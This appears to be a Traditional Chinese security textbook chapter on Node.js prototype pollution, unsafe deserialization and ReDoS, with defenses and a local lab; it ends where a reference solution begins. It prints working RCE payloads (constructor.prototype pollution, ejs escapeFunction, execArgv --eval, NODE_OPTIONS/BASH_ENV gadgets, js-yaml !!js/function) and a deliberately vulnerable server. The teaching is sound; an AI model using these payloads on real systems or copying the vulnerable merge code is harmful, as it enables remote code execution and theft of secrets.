# 第 13 章：反序列化、原型鏈汙染與 Node.js 執行時期漏洞

## 從你已知的出發

為什麼 `JSON.parse('{"__proto__": {"isAdmin": true}}')` 單獨執行時明明非常安全，但只要把解析出來的物件丟進一個常見的 `deepMerge(config, body)` 設定合併函式裡，整台 Node.js 伺服器上所有後續進來的普通使用者請求，瞬間全都變成了管理員，甚至在背景跑健康檢查時直接觸發遠端程式碼執行（RCE）？

因為 Node.js 執行時期有兩個跟靜態語言截然不同的命門。一是**全域共享的原型鏈**（Prototype Chain）：同一個執行領域（Realm）裡的普通物件 `{}` 都繼承自 `Object.prototype`，只要遞迴合併函式讓外部輸入順著 `__proto__` 或 `constructor.prototype` 寫入全域原型，毒藥就會跨請求潛伏，等 `child_process.spawn` 或模板引擎讀取未定義的選項時才引爆。二是**單執行緒事件迴圈**（Event Loop）上的回溯型正規表達式引擎：不用大流量，一個 `29 bytes` 的字串就能觸發上億次指數級回溯，把高併發閘道釘死好幾秒。本章就從這兩個破口切入，推導 RCE Gadget 串聯與根治防線。

---

## 機制與推導

### 攻擊者目標與實質影響

攻擊者鎖定 Node.js 執行時期與反序列化邊界下手時，追求的是三個能直接摧毀系統防線的實質戰果：

第一是**遠端程式碼執行（RCE）**。透過原型鏈汙染把 `shell`、`env`（像是 `NODE_OPTIONS`）塞進 `child_process` 的預設選項，或是汙染模板引擎（如 `ejs`、`pug`）動態生成程式碼時讀取的內部屬性，再不然就是利用舊版 YAML／自訂反序列化的函式標籤，直接在 API 伺服器或背景 Worker 上跑起任意系統指令。一旦拿到 Node.js 行程控制權，攻擊者馬上能從 `process.env` 裡把資料庫連線密碼、JWT 簽章私鑰（見第 4 章）與內部微服務憑證一掃而空。

第二是**跨請求的權限提升與商業邏輯繞過**。就算系統裡暫時找不到能湊出 RCE 的 Gadget，攻擊者只要把 `Object.prototype.isAdmin = true` 或 `Object.prototype.role = "admin"` 寫進全域原型鏈，接下來伺服器上任何繼承自 `Object.prototype`、且本身沒有明確定義同名自有屬性的物件，在被檢查 `if (user.isAdmin)` 時都會順著原型鏈讀到這個被植入的 `true`，當場繞過身分授權檢查（見第 6 章）。

第三則是**單執行緒阻斷服務（Event Loop Starvation / DoS）**。利用寫出巢狀量詞的正規表達式（ReDoS），只靠單一請求就能把 V8 主執行緒鎖死數秒到數分鐘。對 NexusPay 這種尖峰吞吐量達 `2,000 req/s`、Node.js `keepAliveTimeout = 5 s` 的高併發閘道來說，主執行緒只要卡住幾秒鐘，成千上萬筆正常結帳請求就會在佇列裡集體逾時，甚至害 Kubernetes 的 Liveness Probe 健康檢查跟著失敗，引發整個叢集 Pod 連鎖重啟。

在真實的跨層攻擊鏈裡，拿到 Node.js 執行時期的 RCE 往往只是起點：攻擊者站穩容器內部後，下一步就會結合第 11 章的 SSRF 去打雲端 Metadata 端點偷取 IAM 角色，或是往底層探測容器與 Linux 核心隔離邊界（見第 17 至 19 章）。

---

### 原型鏈汙染：`__proto__` 與 `constructor.prototype` 的寫入機制

在 JavaScript 裡，當我們讀取 `obj[key]`、而 `obj` 本身並沒有名為 `key` 的自有屬性（own property）時，V8 引擎就會順著物件內部的 `[[Prototype]]` 隱藏指標一路往上找，直到找到該屬性，或是撞上 `Object.prototype` 頂端的 `null` 為止。

這套查找機制在「只讀不寫」的時候完全沒問題；但只要遇上**遞迴寫入**，它就會搖身一變，成了能跨物件竄改全域狀態的危險工具。要看懂這個魔術，得先分清楚直接寫物件字面值跟呼叫 `JSON.parse()` 的差別：

```javascript
// 1. 物件字面值：這裡的 __proto__ 是語法特殊標記，只會改掉 a 的原型，不會建出名為 "__proto__" 的自有屬性
const a = { __proto__: { x: 1 } };
console.log(Object.keys(a)); // []

// 2. JSON.parse：完全只照 JSON 規格拆字串，真的在 b 上面建了一個名為 "__proto__" 的自有可列舉屬性！
const b = JSON.parse('{"__proto__": {"isAdmin": true}}');
console.log(Object.keys(b)); // [ '__proto__' ]
```

單看 `JSON.parse()` 產出的物件 `b`，它只是帶著一個叫做 `"__proto__"` 的普通自有屬性，這時全域的 `Object.prototype` 還毫髮無傷。
真正的災難發生在下一行——當後端把這個 `b` 傳進常見的遞迴深度合併（`deepMerge`）、物件複製（`clone`）或按路徑賦值函式（如 `setByPath(target, "a.b.c", val)`）時：

```javascript
// 看似無害、實則洞開的遞迴設定合併函式
function deepMerge(target, source) {
  for (const key of Object.keys(source)) {
    if (source[key] && typeof source[key] === 'object') {
      if (!target[key]) target[key] = {};
      deepMerge(target[key], source[key]); // 當 key 是 "__proto__" 時，target["__proto__"] 直接拿到 Object.prototype！
    } else {
      target[key] = source[key];
    }
  }
  return target;
}
```

我們跟著程式一步步走：在第一層迴圈裡，`Object.keys(source)` 吐出了 `'__proto__'`。接著遞迴呼叫 `deepMerge(target['__proto__'], source['__proto__'])`——注意看！這時傳進第二層的 `target['__proto__']` 觸發了 `Object.prototype.__proto__` 的 getter，拿到的正是**全伺服器共用的 `Object.prototype` 本體**！於是到了第二層迴圈執行 `target[key] = source[key]` 時，所有的屬性就這樣一筆一筆直接寫進了 `Object.prototype`：

```text
攻擊者請求 (Source)
  POST /api/v1/webhook/config
  Body: {"__proto__": {"shell": "/bin/sh", "env": {"NODE_OPTIONS": "..."}}}
          │
          ▼  JSON.parse() 產出含自有屬性 "__proto__" 的物件
  deepMerge(target, source)
    ├─ 讀取 target["__proto__"]  ──▶ 觸發 Object.prototype.__proto__ getter
    │                                回傳全域共享的 Object.prototype 本體
    └─ 遞迴寫入 target["__proto__"]["shell"] = "/bin/sh"
          │
          ▼  全域執行時期狀態已遭竄改（跨所有後續請求生效）
  Object.prototype
    ├─ .shell = "/bin/sh"
    └─ .env   = { NODE_OPTIONS: "--require /tmp/payload.js" }
          │
          ▼  後續請求觸發未設防的匯點 (Sink)
  child_process.spawn("git", ["status"], {})
    └─ normalizeSpawnArguments() 讀取 options.shell 與 options.env
       因為 {} 無自有屬性，沿原型鏈命中 Object.prototype ──▶ RCE
```

很多工程師看到這裡，馬上在 `deepMerge` 裡加一行 `if (key === '__proto__') continue;`，或是加上 Node.js 的 `--disable-proto=throw` 啟動旗標，以為這樣就天下太平了。

殊不知，JavaScript 裡還有第二條一模一樣能通往全域原型的捷徑：**`constructor.prototype`**！
對任何一個原型沒被改動、本身也沒定義 `"constructor"` 自有屬性的普通物件 `{}` 來說，讀取 `target['constructor']` 會順著原型鏈找到該執行領域的 `Object` 建構函式；而再往下讀一步 `Object['prototype']`，拿到的照樣是那個全域共享的 `Object.prototype` 本體。所以攻擊者只要把 Payload 換成這樣：

```json
{
  "constructor": {
    "prototype": {
      "isAdmin": true
    }
  }
}
```

整個過程連半個 `"__proto__"` 字眼都沒碰到，所有只擋 `"__proto__"` 的黑名單與 `--disable-proto=throw` 啟動參數當場被輕鬆繞過。

---

### 從原型鏈汙染走到 RCE：兩大經典 Gadget Chain 拆解

按照第 1 章與第 8 章的污點追蹤模型，把髒資料寫進 `Object.prototype` 只是完成了「全域狀態植入」；要真正變成遠端程式碼執行（RCE），還需要在應用程式或 Node.js 標準函式庫裡找到一個 **Gadget（跳板）**——也就是某段會從選項物件裡讀取「呼叫者平常省略不傳的屬性」、而且沒檢查它是不是自有屬性，最後直接拿去拼成系統指令或動態程式碼的 Sink。

在 Node.js 後端環境裡，最容易被點燃的兩條引信就是 `node:child_process` 與伺服器端模板引擎。

#### 路線 A：`node:child_process` 的 `shell`、`env` 與 `NODE_OPTIONS`

翻開 Node.js 標準函式庫的 `lib/child_process.js`，不管你呼叫的是看似安全的 `spawn`、`execFile` 還是 `fork`，底層都會先經過 `normalizeSpawnArguments(file, args, options)` 來整理啟動參數。當開發者呼叫 `spawn('git', ['status'], { timeout: 5000 })`（甚至完全省略第三個參數，讓內部預設拿空物件 `{}` 當 `options`）時，標準函式庫裡有兩行關鍵讀取：

```javascript
// 簡化自 Node.js child_process.js 的參數正規化邏輯
const shell = options.shell;            // 呼叫端沒傳？順著原型鏈讀到 Object.prototype.shell！
const env = options.env || process.env; // 呼叫端沒傳？順著原型鏈讀到 Object.prototype.env！
```

要把這兩行讀取串成百發百中的 RCE，有兩個底層細節一定要搞清楚：

第一個細節：**為什麼攻擊者都是汙染 `Object.prototype.env = { NODE_OPTIONS: "..." }`，而不是直接寫 `Object.prototype.NODE_OPTIONS = "..."`？**
來看那句 `const env = options.env || process.env;`。在正常沒被汙染的時候，`options.env` 是 `undefined`，所以 `env` 會回退去拿 `process.env`。但 `process.env` 在 Node.js 底層是一個特殊的 C++ 原生代理物件，當 `uv_spawn` 要把環境變數打包成字串陣列傳給作業系統時，它並不會傻傻去爬 JavaScript 的 `Object.prototype`。
反過來，只要攻擊者直接汙染了 `Object.prototype.env = { NODE_OPTIONS: '--require /tmp/payload.js' }`，那 `options.env` 順著原型鏈讀到的就是一個為真值（truthy）的普通 JS 物件，直接把後面的 `process.env` 給整碗取代掉！

第二個細節：**為什麼光有 `NODE_OPTIONS` 還不夠，常常還得配上一顆 `Object.prototype.shell`？**
因為 `NODE_OPTIONS` 這個環境變數，只有在新啟動的子行程**本身就是 Node.js 執行時期**（比如呼叫 `child_process.fork()`、`npm`，或是直接 `spawn('node', ...)`）時才會被讀取。而且 Node.js 官方為了安全，對 `NODE_OPTIONS` 設了嚴格白名單：它准許用 `--require`（`-r`）、`--import` 或 `--inspect`，但**明確禁止**在 `NODE_OPTIONS` 裡直接塞 `--eval`（`-e`）。
所以面對不同的子行程呼叫，攻擊者有兩套打法：
- 如果後端呼叫的是 `child_process.fork('./worker.js')`：因為 `fork` 跑的一定是 `node`，而且 `fork` 還會額外讀取 `options.execArgv` 作為命令列參數（不受 `NODE_OPTIONS` 白名單限制！），攻擊者只要直接汙染 `Object.prototype.execArgv = ["--eval=require('child_process').execSync('id')"]`，連半個暫存檔都不用寫就能當場 RCE。
- 如果後端呼叫的是 `child_process.spawn('git', ['--version'])` 這類非 Node 的外部程式：`git` 根本不認識 `NODE_OPTIONS`。這時攻擊者就會同時汙染 `Object.prototype.shell`——例如把 `shell` 設成 `"/bin/bash"` 並搭配 `env: { BASH_ENV: "/tmp/payload.sh" }`（因為 Bash 以非互動模式 `-c` 啟動時會自動載入並執行 `BASH_ENV` 指向的腳本）；或者更狠一點，直接把 `Object.prototype.shell` 設成 `"node"`，再配上一組 `env: { NODE_OPTIONS: "--require /proc/self/environ" }`（或已知的本地檔案路徑），強迫 `spawn` 改用 `node` 當作外殼啟動，並在進入主程式前就先載入 `--require` 指定的惡意模組！

#### 路線 B：伺服器端模板引擎（`ejs`、`pug`、`handlebars`）

如果整台 Web 伺服器從頭到尾都沒呼叫 `child_process`，攻擊者就會把目光轉向伺服器端模板引擎。因為多數模板引擎在編譯模板時，都是把 HTML 跟變數拼接成一長串 JavaScript 程式碼，最後丟進 `new Function(...)` 裡動態編譯執行。

以早期未對選項物件做自有屬性隔離的 `ejs` 為例，當程式呼叫 `ejs.compile(template, opts)` 時，它會從 `opts` 讀取一些平常開發者根本不會傳的內部編譯選項。攻擊者只要送出這組汙染 Payload：

```json
{
  "__proto__": {
    "client": true,
    "escapeFunction": "1; return global.process.mainModule.require('child_process').execSync('id').toString();",
    "compileDebug": true
  }
}
```

等到下次有請求觸發 `ejs` 編譯（或未命中編譯快取而重新編譯）模板時，`ejs` 就會順著原型鏈讀出那段被動過手腳的 `opts.escapeFunction`，一字不漏地把它拼進 `new Function(...)` 的函式主體裡，在渲染頁面的那一刻直接執行任意系統指令。像 `pug` 的 `block` / `self` 節點屬性，以及舊版 `handlebars` 的 AST 編譯器，也都曾爆出原理如出一轍的原型鏈 RCE Gadget。

> [!NOTE]
> 讀到後面第 26 章時你會看到，現代 V8 引擎為了防範底層 C++ 記憶體損毀漏洞，引入了 **V8 Sandbox**（又稱 Ubercage，在虛擬記憶體裡圈出一段 `1 TiB` 的連續位址空間，裡面全部改用 `32 bits` 的壓縮指標作為相對偏移量，防止指標越界寫到沙箱外）。但請注意：**原型鏈汙染完全發生在合法的 JavaScript 語意層**，從頭到尾都沒有違反 V8 的記憶體規則，所以 V8 Sandbox 是絕對不會攔截原型鏈汙染的。

---

### 不安全反序列化：YAML 標籤、`JSON.parse` `reviver` 與 DTO 綁定

很多從 Java 或 Python 轉寫 Node.js 的工程師會好奇：「在 Java 裡，`ObjectInputStream.readObject()` 一還原物件就會自動觸發類別的生命週期方法；在 Python 裡，`pickle.loads()` 更會直接執行 `__reduce__` 指定的任意函式。那 Node.js 的 `JSON.parse()` 也有反序列化漏洞嗎？」

先給定心丸：**標準的原生 `JSON.parse(str)` 本身只認得六種純資料型別（字串、數字、布林、`null`、陣列、純物件），它不會自動實例化任何自訂類別，也不會在解析當下直接執行程式碼。**

Node.js 生態系裡會爆出「不安全反序列化 RCE」，全都是因為開發者嫌 JSON 能表達的型別太陽春，自己又在上面**疊加了一層支援「富型別（Rich Types）」或「動態類別還原」的解析器**：

1. **YAML 解析器的危險型別標籤（`js-yaml` `< 4.0.0`）**：
   YAML 1.2 規格允許用 `!!` 標籤來指定資料型別。在早期的 `js-yaml` 3.x 版本中，預設的 `yaml.load()` 採用了包山包海的 `DEFAULT_FULL_SCHEMA`，竟然直接支援 `!!js/function`、`!!js/regexp` 與 `!!js/undefined`！攻擊者只要上傳這樣一份 YAML 設定檔：

   ```yaml
   # 針對 js-yaml < 4.0.0 預設 yaml.load() 的惡意 Payload
   webhookHandler: !!js/function >
     function () {
       return global.process.mainModule.require('child_process').execSync('whoami').toString();
     }
   ```

   `yaml.load()` 解析完，真的會在記憶體裡生出一個熱騰騰的 JavaScript 函式；只要後面程式碼呼叫了 `config.webhookHandler()`，或是把這個函式塞進一個帶有 `toString` / `valueOf` 立即執行函式（IIFE）的物件裡觸發字串轉換，當場就能拿下 RCE。雖然從 `js-yaml` `4.0.0` 開始，官方已經把 `yaml.load()` 的預設行為改得跟以前的 `safeLoad()` 一樣（拔掉了危險的 JS 函式標籤），但在舊專案或被人手動開啟 `DEFAULT_FULL_SCHEMA` 的地方，這個洞依然一戳就破。
2. **自製函式序列化套件與亂寫的 `JSON.parse` `reviver`**：
   有些早期用來把物件塞進 Redis 或 Cookie 的套件（最著名的苦主就是 `node-serialize`），為了連物件裡的方法都能一起存，發明了 `_$$ND_FUNC$$_` 這種特殊字串前綴，然後在反序列化時直接呼叫 `eval('(' + str + ')')` 把它變回函式。攻擊者只要在字串尾巴補上一對括號 `()` 變成立即執行函式（IIFE），在 `unserialize()` 還沒回傳前就已經把伺服器打穿了。同理，如果開發者自己寫 `JSON.parse(raw, reviver)`，卻在 `reviver` 回呼裡看欄位名稱去動態執行 `new ClassRegistry[key](val)`，等於是親手把純資料的 JSON 升級成了任意類別實例化漏洞。
3. **ORM 與 DTO 自動轉換（如 NestJS `class-transformer`）**：
   就算沒有直接 RCE，當後端用 `plainToInstance(UpdateUserDto, req.body)` 把前端傳來的 JSON 自動綁定成類別實例，卻忘了在 `ValidationPipe` 打開 `{ whitelist: true, forbidNonWhitelisted: true }` 時，攻擊者偷塞的額外欄位就會原封不動掛在 DTO 實例上，接著在 `Object.assign(userEntity, dto)` 時直接覆寫掉資料庫實體的權限或餘額欄位（也就是第 6 章談過的 Mass Assignment / BOPLA）。

---

### ReDoS（正規表達式阻斷服務）與 Event Loop 飢餓推導

最後我們來看那個不用拿到 RCE、光靠不到 `30 bytes` 就能讓整台 Node.js 伺服器瞬間休克的殺手：**ReDoS（Regular Expression Denial of Service）**。

為什麼一個短短的字串能卡死整顆 CPU？因為 V8 引擎內建的正規表達式引擎 **Irregexp**，骨子裡是一台**回溯型非確定有限自動機（Backtracking NFA）**。

回溯型 NFA 的脾氣很執著：遇到像 `+`、`*`、`{m,n}` 這種貪婪量詞（Greedy Quantifiers）時，它一定先盡可能吃下最多的字元；遇到 `|` 交替分支時，則按左到右的順序一條路走到黑。一旦走到後面發現匹配失敗（比如撞上結尾的 `$` 錨點卻還有一個字元對不上），它不會直接放棄，而是**退回上一個分岔點（Backtrack）**，把剛剛吃掉的字元吐一個出來，換種切分方式再試一遍。

當一個帶有結尾錨點（如 `$`）的正規表達式裡，出現了**具歧義的巢狀量詞**（最典型的就是 `^(a+)+$`）或是**彼此重疊的交替分支**（像 `^(a|a)+$`、`^([a-zA-Z0-9]+)*$`）時，同一串連續的 `'a'` 可以有成千上萬種不同的分組切法。只要攻擊者在字串最後面放一個永遠對不上的字元（比如 `'!'`），這台沒有對失敗狀態做記憶化（Memoization）的回溯引擎，就會被迫把**所有可能的切分組合全部窮舉走過一遍**，才甘心吐出一句 `false`！這時匹配所需的步數會隨著字元長度 $n$ 呈現恐怖的**指數級爆炸（$O(2^n)$）**。

我們直接拿 NexusPay 閘道的基準參數，用 Worked Example 算算看一個 `29 bytes` 的字串能闖出多大的禍：

```text
=== Worked Example: NexusPay Webhook 事件名稱驗證器 ReDoS 步數與阻塞量化推導 ===

目標正規表達式 : ^(a+)+$  （具歧義巢狀量詞，等效於許多誤寫的分段名稱檢查規則）
惡意輸入字串   : "aaaaaaaaaaaaaaaaaaaaaaaaaaaa!"  (28 個 'a' + 1 個 '!', n = 28, 總長僅 29 bytes)

1. 指數回溯步數推導：
   對長度為 n = 28 的連續 'a' 而言，相鄰字元之間共有 n - 1 = 27 個「切分點」。
   每個切分點都可以獨立選擇「在此結束當前的 (a+) 群組」或「繼續延伸當前的 (a+)」，
   光這 28 個 'a' 就存在 2^(n-1) = 2^27 = 134,217,728 種不同的群組切分方式！
   每當引擎走到第 29 個字元 '!' 發現與結尾錨點 ($) 匹配失敗時，就必須退回重切；
   加計外層與內層量詞的狀態轉移與結尾檢查，NFA 引擎在宣告失敗前須走完約 O(2^n) 步：

     在此簡化模型下取總回溯步數 ≈ 2^28 = 268,435,456 步（約 2.68 × 10^8 步）

2. Event Loop 阻塞時間估算（V8 Irregexp 單執行緒執行基準模型）：
   以單次回溯狀態轉移約需 20 ns（等效吞吐量 5 × 10^7 steps/s）作為估算基準：

     單次同步阻塞時間 ≈ 268,435,456 / (5 × 10^7 steps/s) ≈ 5.37 秒

3. 對 NexusPay 系統基準常數的連鎖衝擊：
   - 單次 regex.test() 同步執行就釘死 V8 主執行緒約 5.37 s！在這 5.37 s 內，該 Worker 的 Event Loop 完全無法處理任何其他 I/O 回呼、資料庫回應或計時器。
   - 對照 Node.js keepAliveTimeout = 5 s：若有閒置保活連線正處於 5 s 計時視窗，此 5.37 s 的同步阻塞會直接延後計時器與事件迴圈處置。
   - 對照 Nginx proxy_read_timeout = 30 s：若同一單執行緒 Worker 佇列同時被塞入 6 筆此類 29-byte 惡意請求並依序串行執行，在每筆算完前都無法吐出回應的簡化模型下，第 6 筆請求要排隊 5 × 5.37 s ≈ 26.85 s 才開始算、算到 6 × 5.37 s ≈ 32.2 s (> 30 s) 才結束，上游 Nginx 將直接觸發 504 Gateway Timeout！
   - 對照系統尖峰吞吐量 2,000 req/s：在短短 5.37 s 的阻塞時間窗內，外部約有 5.37 s × 2,000 req/s ≈ 10,740 筆新請求湧入閘道，凡是分派到該受阻 Worker 的正常結帳與提領請求將全數卡死在佇列中。
```

這正是 ReDoS 在 Node.js 架構裡如此致命的原因：`regex.test()` 是**百分之百同步的 CPU 密集運算**。只要主執行緒卡在裡面算那 `2.68 億` 步，整個事件迴圈就跟拔掉插頭一樣動彈不得；連 Kubernetes 打過來的 `/health` 健康檢查都沒辦法回傳，幾秒後就會被判定死亡而整顆 Pod 重啟。

---

## 故障模式與防禦

看清楚原型鏈汙染、富型別反序列化與 ReDoS 的引爆機制後，我們來盤點工程團隊在修補這三類漏洞時最常踩進的四個誤區，以及真正能斬草除根的寫法。

### 故障模式 1：只用黑名單擋掉 `"__proto__"`，卻放過了 `"constructor"` 與 `"prototype"`

很多團隊收到掃描報告說 `deepMerge` 有原型鏈汙染，就隨手加一行 `if (key === '__proto__') continue;` 交差。前面我們已經推導過了，這樣寫完全擋不住 `{"constructor": {"prototype": {"isAdmin": true}}}`；更別提在某些支援陣列語法或 URL 編碼鍵名的查詢字串解析器（像舊版 `qs` 或自製 parser）裡，還可能因為先檢查黑名單、後解碼鍵名而被輕鬆繞過。

要徹底切斷原型鏈汙染，請從容器型別與白名單驗證雙管齊下：
- **動態鍵值容器一律改用 `Object.create(null)` 或 `Map`**：只要某個物件是被拿來當作裝載外部鍵值的字典（Dictionary）或設定合併容器，建立時就用 `Object.create(null)` 或 ES6 的 `new Map()`。因為 `Object.create(null)` 建立出來的純淨物件，內部的 `[[Prototype]]` 直接就是 `null`，上面既沒有 `__proto__` 存取器，也沒有 `constructor` 屬性，從物理結構上就把通往 `Object.prototype` 的橋給拆了。
- **入口 Schema 白名單 + 自有屬性雙重把關**：在把外部 JSON 丟進任何合併邏輯之前，先用 `zod`（預設會剝除未定義的未知欄位，或加 `.strict()` 直接報錯拒絕）或 `ajv`（設定 `additionalProperties: false`）做嚴格的結構驗證，只拿驗證通過的新物件往下傳；同時在所有的通用合併工具函式裡，強制檢查 `Object.hasOwn(source, key)` 並明確攔截 `['__proto__', 'constructor', 'prototype']` 三個關鍵字。

### 故障模式 2：以為加上 `--disable-proto=throw` 啟動參數就高枕無憂

Node.js 官方提供了一個很實用的啟動旗標 `--disable-proto=throw`（或 `delete`），只要程式裡有人敢讀寫 `Object.prototype.__proto__`，V8 就會當場拋出 `ERR_PROTO_ACCESS` 例外（或把該存取器徹底刪掉）。不少資深團隊把這條參數寫進 Dockerfile 的啟動指令裡，就以為這輩子再也不會遇到原型鏈汙染了。

請務必記住這條參數的防護邊界：**`--disable-proto=throw` 只管得到 `__proto__` 這個存取器，對 `target['constructor']['prototype']` 的讀寫是完全不攔截的！**
這條旗標非常適合放進生產環境當作縱深防禦（Defense in Depth）的警報器，但它絕對不能取代安全的物件合併函式與 Schema 驗證。如果你的應用程式跟底下所有的第三方套件都不需要在執行時期動態改寫內建原型，也可以在啟動完成後測試加上 `Object.freeze(Object.prototype)` 把全域原型直接凍死（上線前務必跑過完整測試，確認沒有老舊的 ORM 或 polyfill 會在執行期偷改 `Object.prototype` 而被撞壞）。

### 故障模式 3：拿原生 `RegExp` 去跑使用者輸入，只靠肉眼看有沒有巢狀量詞

很多開發者覺得：「我這個正規表達式只用來檢查 Email 或 Webhook 事件名稱，而且我肉眼看過沒有 `(a+)+` 這種笨寫法，肯定不會有 ReDoS！」
事實上，真實世界裡高達八成的 ReDoS 都不是長得像 `(a+)+` 這麼明顯，而是藏在看似人畜無害的交替分支或選填群組裡（比如 `/^([a-z]+|\w+)+$/` 或複雜的網址／Email 檢查規則），靠人類肉眼在 Code Review 時根本不可能窮舉出所有的歧義回溯路徑。

對付 ReDoS 最徹底的工程解法有兩道閘門：
1. **把面對外部輸入的正規表達式引擎換成線性時間的 `RE2`**：直接引入 Google RE2 的 Node.js 綁定套件（`re2`）。RE2 底層採用的是 Thompson NFA / DFA 演算法，從設計上就拿掉了回溯機制（因此它不支援反向參照 `\1` 與前後環視斷言 lookaround），不管攻擊者餵進多刁鑽的字串，它都能從數學上保證匹配時間嚴格維持在線性的 **$O(n)$**，對指數級回溯天生免疫。
2. **先卡死位元組長度上限，並在 CI 掛上靜態檢測**：在呼叫任何正規表達式之前，先設一道硬性的長度閘門——同時檢查 `input.length` 與 UTF-8 位元組長度 `Buffer.byteLength(input, 'utf8') <= 128`（一個 Webhook 事件名稱或使用者帳號根本不需要超過 `128 bytes`）；並在 CI 管線裡掛上 `eslint-plugin-security` 的 `detect-unsafe-regex` 或專用的 `recheck` 分析器，只要有人寫出帶指數或超線性回溯風險的 pattern 就直接在 PR 階段擋下來。

### 故障模式 4：在反序列化邊界使用支援「程式碼或型別還原」的解析器

把外部傳來的設定檔、Cookie 或快取字串，交給像舊版 `js-yaml` `load()`、`node-serialize`、或是寫了動態 `new Class()` 的 `JSON.parse` `reviver`，本質上就是打破了第 1 章強調的「資料與指令分離」鐵律。

守住反序列化邊界的規矩只有一條：**跨過信任邊界的外部輸入，永遠只准用純資料格式解析**。優先全面採用原生的 `JSON.parse()` 搭配 Zod / Ajv 結構驗證；如果業務非得讀寫 YAML 不可，強制要求 `js-yaml` 版本必須 `>= 4.0.0`，並在呼叫時顯式指定 `JSON_SCHEMA` 或 `FAILSAFE_SCHEMA`，嚴格禁止任何自訂型別標籤。

---

## 動手做

- **難度**：進階
- **預估時間**：60 分鐘

現在我們在本地建一個迷你的 NexusPay 閘道靶機（`server.js`），親手體驗怎麼用**一筆 `constructor.prototype` 請求**隔空竄改後面健康檢查端點的 `child_process.spawn` 拿到 RCE，再親眼看看 **`29 bytes` 的字串**怎麼把單執行緒 Event Loop 卡死好幾秒，最後動手把它們全部修好。

> [!CAUTION]
> 以下靶機包含真實可觸發系統命令執行的漏洞，請務必只在你本機的隔離環境（綁定 `127.0.0.1`）中執行，切勿暴露於任何外部網路。

### 步驟 1：建立本地含漏洞的 NexusPay 閘道靶機

在本地建一個空目錄 `~/labs/ch13-nodejs`，安裝好稍後修補要用的 `re2` 套件，並存下這支故意留了兩個大洞的 `server.js`：

```bash
mkdir -p ~/labs/ch13-nodejs && cd ~/labs/ch13-nodejs
npm init -y
npm install re2
```

```javascript
// server.js — 包含 Prototype Pollution 與 ReDoS 破口的本地教學靶機
const http = require("node:http");
const { spawn } = require("node:child_process");

const globalConfig = { webhookTimeoutMs: 3000 };

// 破口 1：既沒檢查自有屬性，也沒擋掉 __proto__ / constructor / prototype 的遞迴合併
function deepMerge(target, source) {
  for (const key of Object.keys(source)) {
    if (source[key] && typeof source[key] === "object" && !Array.isArray(source[key])) {
      if (!target[key]) target[key] = {};
      deepMerge(target[key], source[key]);
    } else {
      target[key] = source[key];
    }
  }
  return target;
}

// 破口 2：帶有具歧義巢狀量詞的回溯型正規表達式
const unsafeEventRegex = /^(a+)+$/;

const server = http.createServer((req, res) => {
  // 端點 1：更新 Webhook 設定（把外部 JSON 直接丟進 deepMerge）
  if (req.method === "POST" && req.url === "/api/v1/webhook/config") {
    let body = "";
    req.on("data", (chunk) => (body += chunk));
    req.on("end", () => {
      deepMerge(globalConfig, JSON.parse(body));
      res.writeHead(200, { "Content-Type": "application/json" });
      res.end(JSON.stringify({ status: "updated" }));
    });
    return;
  }

  // 端點 2：系統健康診斷（呼叫 spawn 時第三個參數傳了空物件 {}，未顯式指定 shell 與 env）
  if (req.method === "GET" && req.url === "/api/v1/health/diag") {
    const child = spawn("node", ["-e", "console.log('healthy')"], {});
    let out = "";
    child.stdout.on("data", (d) => (out += d));
    child.on("close", () => {
      res.writeHead(200);
      res.end(out || "done");
    });
    return;
  }

  // 端點 3：驗證 Webhook 事件名稱（直接用原生 RegExp 跑外部輸入並記錄耗時）
  if (req.method === "POST" && req.url === "/api/v1/webhook/verify") {
    let body = "";
    req.on("data", (chunk) => (body += chunk));
    req.on("end", () => {
      const { eventName } = JSON.parse(body);
      const t0 = performance.now();
      const ok = unsafeEventRegex.test(eventName || "");
      const elapsedMs = (performance.now() - t0).toFixed(2);
      res.writeHead(200, { "Content-Type": "application/json" });
      res.end(JSON.stringify({ ok, elapsedMs }));
    });
    return;
  }

  res.writeHead(404);
  res.end("not found");
});

server.listen(13000, "127.0.0.1", () => console.log("Listening on 127.0.0.1:13000"));
```

### 步驟 2：動手攻擊與修補任務

先把 `node server.js` 跑起來，接著開另一個終端機依序完成下面三項任務：

1. **任務 A（串聯 Prototype Pollution 拿下 RCE）**：
   請故意**不使用** `"__proto__"` 關鍵字，改走 `constructor.prototype` 路線對 `/api/v1/webhook/config` 送出一筆設定更新，汙染全域的 `shell` 與 `env.NODE_OPTIONS`；接著訪問完全無關的 `/api/v1/health/diag` 端點，讓它自動載入並執行你放在 `/tmp/poc_probe.js` 的驗證腳本。
2. **任務 B（實測 `n = 28` 的 ReDoS 阻塞威力）**：
   對 `/api/v1/webhook/verify` 送出 `"a".repeat(28) + "!"`（共 `29 bytes`），觀察回傳的 `elapsedMs` 高達幾千毫秒，並試著在它卡住的那幾秒內同時去打 `/api/v1/health/diag`，體會整台伺服器被單一請求釘死的感覺。
3. **任務 C（徹底修補並重測）**：
   以 `Object.create(null)`、`Object.hasOwn`、禁用鍵名清單（`__proto__`、`constructor`、`prototype`）、`--disable-proto=throw` 以及 `RE2` 線性引擎（外加 `128 bytes` 長度上限）改寫 `server.js`，重跑上面兩個攻擊確認全部失效。

### 外部靶場對照檢查點（PortSwigger Web Security Academy）

本地實驗收工後，強烈推薦到 **PortSwigger Web Security Academy** 把下面兩組模組刷過一遍，訓練自己在看不到原始碼的黑箱環境裡怎麼把原型鏈汙染找出來：

1. **Prototype pollution（Server-side prototype pollution 路線）**：
   - *Privilege escalation via server-side prototype pollution*：學會在黑箱測試時，先不要急著塞危險的 RCE 屬性（免得把別人靶機搞崩潰），而是先汙染像 Express 的 `json spaces`、`status` 或 `content-type` 這類無害的框架設定，從回應 JSON 的縮排空白數或狀態碼變化，優雅地確認伺服器端原型鏈汙染真的成立。
   - *Remote code execution via server-side prototype pollution*：練習怎麼在黑箱下用 `execArgv`（塞 `--eval`）或 `shell` + `NODE_OPTIONS` 打出 DNS / HTTP 外帶（OAST）互動，以及遇到 `__proto__` 被擋時怎麼秒切 `constructor.prototype` 穿過去。
2. **Insecure deserialization**：
   - 挑兩題 *Modifying serialized objects* 與 *Developing a custom gadget chain* 動手做，跨語言體會一下 PHP / Java / Ruby 跟 Node.js 在反序列化漏洞上的共通本質：**外部純資料在跨過還原邊界的那一刻被賦予了型別或全域副作用，順著既有程式碼的屬性讀取一路滑進了危險的 Sink**。

---

### 參考解答

#### 1. 任務 A：走 `constructor.prototype` 觸發 `child_process.spawn` RCE

先在 `/tmp/poc_probe.js` 放一行無害的探針腳本，它被載入時會把當前子行程的 PID 寫進 `/tmp/pp_rce_ok` 證明程式碼真的執行了：

```bash
